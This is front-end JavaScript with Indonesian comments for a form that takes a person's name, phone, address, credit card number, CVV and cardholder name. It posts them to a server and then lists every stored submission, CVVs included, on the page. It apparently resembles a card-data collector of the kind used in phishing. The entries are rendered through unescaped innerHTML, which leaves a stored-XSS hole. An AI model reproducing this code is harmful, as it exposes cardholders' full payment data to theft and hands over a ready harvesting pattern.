// Mengambil data historis dari backend dan menampilkannya
const getHistory = () => {
  fetch('http://localhost:3000/getData')
    .then((response) => response.json())
    .then((data) => {
      const historyList = document.getElementById('historyList');
      // Clear previous data
      historyList.innerHTML = '';
      // Memastikan data yang diterima valid
      if (data.data && Array.isArray(data.data)) {
        // Menambahkan data baru ke dalam list
        data.data.forEach((item) => {
          const listItem = document.createElement('li');
          listItem.innerHTML = `
            <p><strong>Nama:</strong> ${item.nama}</p>
            <p><strong>Telepon:</strong> ${item.telepon}</p>
            <p><strong>Alamat:</strong> ${item.alamat}</p>
            <p><strong>Kartu:</strong> ${item.kartu}</p>
            <p><strong>CVV:</strong> ${item.cvv}</p>
            <p><strong>Pemilik Kartu:</strong> ${item.pemilik}</p>
            <p><small>Data disimpan pada: ${new Date(item.timestamp).toLocaleString()}</small></p>
          `;
          historyList.appendChild(listItem);
        });
      } else {
        console.error('Data tidak valid atau kosong');
      }
    })
    .catch((err) => {
      console.error('Gagal mengambil data:', err);
    });
};

document.getElementById('submitBtn').addEventListener('click', () => {
  const data = {
    nama: document.querySelector('input[placeholder="Nama Lengkap"]').value,
    telepon: document.querySelector('input[placeholder="Nomor Telepon"]').value,
    alamat: document.querySelector('input[placeholder="Alamat Lengkap"]').value,
    kartu: document.querySelector('input[placeholder="Nomor Kartu Kredit"]').value,
    cvv: document.querySelector('input[placeholder="CVV"]').value,
    pemilik: document.querySelector('input[placeholder="Nama Pemilik Kartu"]').value,
  };

  console.log('Data yang dikirim:', data); // Tambahkan log untuk melihat data yang dikirim

  fetch('/submit', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(data),
  })
    .then((res) => res.json())
    .then((res) => {
      console.log('Respons dari server:', res); // Log respons dari server
      alert(res.message);
      // Mengambil data historis setelah submit
      getHistory();
    })
    .catch((err) => {
      console.error('Terjadi kesalahan:', err); // Log error jika ada
      alert('Terjadi kesalahan: ' + err);
    });
});

// Memuat data historis saat halaman pertama kali dimuat
window.onload = getHistory;
